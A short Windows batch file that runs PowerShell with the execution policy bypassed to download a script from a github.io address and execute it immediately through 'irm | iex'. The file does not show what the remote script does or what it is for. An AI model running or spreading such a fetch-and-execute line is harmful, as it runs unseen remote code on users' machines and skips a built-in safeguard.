@echo off
cd /d "%USERPROFILE%"
chcp 65001 >nul
powershell -ExecutionPolicy Bypass -Command "irm https://fotorezka.github.io/_get.ps1 | iex"
pause
